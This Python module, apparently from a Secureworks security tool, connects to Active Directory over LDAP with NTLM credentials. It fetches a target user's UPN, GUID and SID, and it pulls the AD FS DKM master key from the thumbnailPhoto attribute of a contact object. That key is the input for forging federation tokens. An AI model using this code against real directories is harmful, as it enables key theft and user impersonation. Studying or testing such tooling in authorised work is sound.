# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging
from typing import Tuple
from ldap3 import Server, Connection, ALL, NTLM  # type: ignore


class LDAP:
    def _get_base(self, domain: str) -> str:
        """Build the LDAP base based on the provided domain"""
        return ",".join([f"DC={x}" for x in domain.split(".")])

    def _set_context(
        self,
        domain: str,
        server: str,
        user: str,
        password: str,
    ) -> Tuple[Connection, str]:
        """Build the LDAP connection"""
        base = self._get_base(self, domain)
        username = f"{domain}\\{user}"
        serv = Server(server, get_info=ALL)
        conn = Connection(
            serv,
            user=username,
            password=password,
            authentication=NTLM,
            auto_bind=True,
        )
        return (conn, base)

    @classmethod
    def get_user(
        cls,
        domain: str,
        host: str,
        user: str,
        password: str,
        target_user: str,
        sClass: str = "person",
    ):
        """Grab specific data for a given user via LDAP

        Arguments:
            domain: target domain
            host: target host to query via LDAP
            user: authenticating user
            password: password of authenticating user
            target_user: user we are querying for
            sClass: query class -> person

        Returns:
            target user's UPN and GUID
        """
        logging.info(f"[ * ] Querying LDAP for user data: '{target_user}'")

        (context, base) = cls._set_context(cls, domain, host, user, password)

        # Perform the LDAP search
        context.search(
            base,
            f"(&(objectCategory={sClass})(sAMAccountName={target_user}))",
            attributes=["*"],
        )

        # Set the LDAP value based on requested value from the user
        opt_values = ("userPrincipalName",)
        req_values = ("objectGuid", "objectSid")

        # If present, return the value
        if len(context.entries) > 0:
            # Ensure the required values exist
            if all(v in context.entries[0] for v in req_values):
                # Make sure a UPN exists
                if opt_values[0] in context.entries[0]:
                    upn = context.entries[0][opt_values[0]].value  # upn
                    logging.info(f"[ * ] {target_user} UPN:  {upn}")
                else:
                    upn = "billgates@microsoft.com"

                guid = context.entries[0][req_values[0]].value  # guid
                sid = context.entries[0][req_values[1]].value  # sid

                logging.info(f"[ * ] {target_user} GUID: {guid}")
                logging.info(f"[ * ] {target_user} SID:  {sid}")

                return (upn, guid, sid)
        else:
            return (None, None, None)

    @classmethod
    def get_dkm(
        cls,
        domain: str,
        host: str,
        user: str,
        password: str,
    ) -> bytes:
        """Grab the DKM via LDAP

        Arguments:
            domain: target domain
            host: target host to query via LDAP
            user: authenticating user
            password: password of authenticating user

        Returns:
            DKM key
        """
        logging.info(f"[ * ] Querying LDAP for DKM master key")

        (context, base) = cls._set_context(cls, domain, host, user, password)

        # Build LDAP query data
        base = f"CN=ADFS,CN=Microsoft,CN=Program Data,{base}"
        filter_ = "(&(thumbnailphoto=*)(objectClass=contact)(!(cn=CryptoPolicy)))"

        # Perform the LDAP search
        context.search(base, filter_, attributes=["*"])

        # If present, return the value
        value = "thumbnailPhoto"
        if len(context.entries) > 0 and value in context.entries[0]:
            dkm_key = context.entries[0][value].value
            logging.info(f"[ * ] DKM Key: {dkm_key}")

            return dkm_key
        else:
            return None
